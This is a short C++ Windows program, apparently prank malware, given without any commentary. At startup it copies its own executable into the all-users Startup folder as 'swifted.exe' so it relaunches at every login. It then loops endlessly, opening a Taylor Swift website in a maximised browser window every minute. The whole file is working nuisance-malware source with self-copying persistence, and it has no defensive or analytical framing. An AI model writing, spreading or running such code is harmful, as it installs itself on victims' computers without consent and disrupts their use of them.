#include <Windows.h>

#include <Shellapi.h>
#include <Lmcons.h>

#pragma comment (lib, "Shell32")

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

void CopySelf() {
	char filename[MAX_PATH];

	BOOL stats = 0;
	DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);

	TCHAR username[UNLEN + 1];
	DWORD usize = UNLEN + 1;
	GetUserName((TCHAR*)username, &usize);

	CopyFile(convertCharArrayToLPCWSTR(filename), L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\swifted.exe", stats);
}

INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	PSTR lpCmdLine, INT nCmdShow)
{
	CopySelf();

	while (true) {
		ShellExecute(NULL, L"open", L"http://www.taylorswift.com", NULL, NULL, SW_SHOWMAXIMIZED);

		Sleep(60000);
	}
}